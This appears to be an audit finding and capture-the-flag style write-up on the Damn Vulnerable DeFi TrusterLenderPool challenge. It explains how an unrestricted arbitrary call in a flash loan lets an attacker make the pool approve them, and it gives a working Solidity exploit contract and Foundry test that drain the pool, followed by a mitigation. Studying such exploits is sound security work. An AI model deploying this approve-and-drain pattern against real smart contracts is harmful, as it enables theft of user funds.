# [H-01] Arbitrary Call Ingestion in TrusterLenderPool Allows Complete Fund Depletion via Flash Loan Abuse

## Severity
**High** - Allows full depletion of protocol funds by any malicious actor without requiring collateral or paying fees.

## Vulnerability Details
The TrusterLenderPool contract implements a flash loan mechanism via the flashLoan function. However, the function introduces a critical flaw by executing an arbitrary low-level call provided entirely by the user via target.functionCall(data).

Because target and data are not sanitized or restricted, an attacker can input the address of the pool's underlying asset (DamnValuableToken) as the target and craft a payload to execute the approve(address,uint256) function. Since the call originates from the pool itself, msg.sender inside the token contract will be the pool's address, inadvertently granting the attacker an unlimited spending allowance. 

The post-loan balance check passes successfully if the attacker requests an amount of 0 tokens, as the pool's balance remains completely unchanged at that specific moment.

Function Structure:
```solidity
function flashLoan(uint256 amount, address borrower, address target, bytes calldata data) external nonReentrant returns (bool) {
    uint256 balanceBefore = token.balanceOf(address(this));
    token.transfer(borrower, amount);
    target.functionCall(data); // <--- VULNERABILITY: Arbitrary execution path
    if (token.balanceOf(address(this)) < balanceBefore) { revert RepayFailed(); }
    return true;
}
```
## Impact
An attacker can completely drain the pool's token balance in a single, atomic transaction block, leading to a total loss of TVL (Total Value Locked) for the protocol.

## Proof of Concept (PoC)
To bypass validation constraints (such as single-transaction execution checks) and achieve complete atomic execution, the exploit must utilize an intermediate attacker contract. 

Below is the verified implementation for the Foundry testing suite inside test/truster/Truster.t.sol:

```solidity
// 1. Intermediate Exploit Contract placed outside the main test contract
contract TrusterAttacker {
    function attack(address poolAddress, address tokenAddress, address recovery, uint256 amount) external {
        TrusterLenderPool pool = TrusterLenderPool(poolAddress);
        DamnValuableToken token = DamnValuableToken(tokenAddress);

        // Craft the malicious calldata to approve this contract instance
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), amount);

        // Trigger the flash loan with 0 amount, forcing the pool to sign the approval
        pool.flashLoan(0, address(this), address(token), data);

        // Exploit the approved allowance to drain the pool to the recovery address
        token.transferFrom(poolAddress, recovery, amount);
    }
}

// 2. Execution entry point within the TrusterChallenge test contract
function test_truster() public checkSolvedByPlayer {
    // Deploy the atomic attacker contract
    TrusterAttacker attacker = new TrusterAttacker();

    // Execute the attack vector in a single transaction from the player account
    attacker.attack(address(pool), address(token), recovery, TOKENS_IN_POOL);
}
``` 

## Tools Used
* Manual Code Review
* Foundry Testing Framework

## Recommended Mitigation
Do not allow arbitrary execution pathways controlled by external untrusted users. Flash loans should interact with borrowers strictly via a standardized, static callback interface (such as ERC-3156). 

If a callback execution is required, strictly limit the target to the msg.sender or the authorized borrower, invoking a specific hardcoded function signature:

// Rectified Implementation Pattern
IERC3156FlashBorrower(borrower).onFlashLoan(msg.sender, address(token), amount, 0, data);
